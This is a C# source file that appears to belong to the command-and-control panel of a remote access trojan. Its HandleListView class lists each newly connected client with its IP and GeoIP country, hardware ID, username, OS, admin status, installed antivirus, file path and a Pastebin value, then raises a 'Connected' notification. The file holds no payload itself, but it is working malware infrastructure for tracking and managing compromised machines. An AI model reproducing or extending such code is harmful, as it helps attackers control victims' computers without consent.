﻿using System;
using Server.MessagePack;
using Server.Sockets;
using cGeoIp;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;

namespace Server.Handle_Packet
{
    public class HandleListView
    {
        public void AddToListview(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                client.LV = new ListViewItem();
                client.LV.Tag = client;
                client.LV.Text = string.Format("{0}:{1}", client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0], client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]);
                string[] ipinf;
                try
                {
                    ipinf = new cGeoMain().GetIpInf(client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
                }
                catch { ipinf = new string[] { "?", "?" }; }
                client.LV.SubItems.Add(ipinf[1]);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Antivirus").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Performance").AsString);
                client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
                client.LV.ToolTipText += "[Pastebin] " + unpack_msgpack.ForcePathObject("Pastebin").AsString;
                client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;

                if (Program.form1.listView1.InvokeRequired)
                {
                    Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                    {
                        lock (Settings.Listview1Lock)
                        {
                            Program.form1.listView1.Items.Add(client.LV);
                            Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                        }

                        if (Properties.Settings.Default.Notification == true)
                        {
                            Program.form1.notifyIcon1.BalloonTipText = $@"Connected 
{client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} : {client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]}";
                            Program.form1.notifyIcon1.ShowBalloonTip(100);
                        }
                    }));
                }
            }
            catch { }

            lock (Settings.Online)
            {
                Settings.Online.Add(client);
            }
            new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} connected successfully", Color.Green);
        }

        public void Received(Clients client)
        {
            if (Program.form1.listView1.InvokeRequired)
            {
                Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                {
                    try
                    {
                        lock (Settings.Listview1Lock)
                            if (client != null && client.LV != null)
                                client.LV.ForeColor = Color.Empty;
                    }
                    catch { }
                }));
            }
        }
    }
}
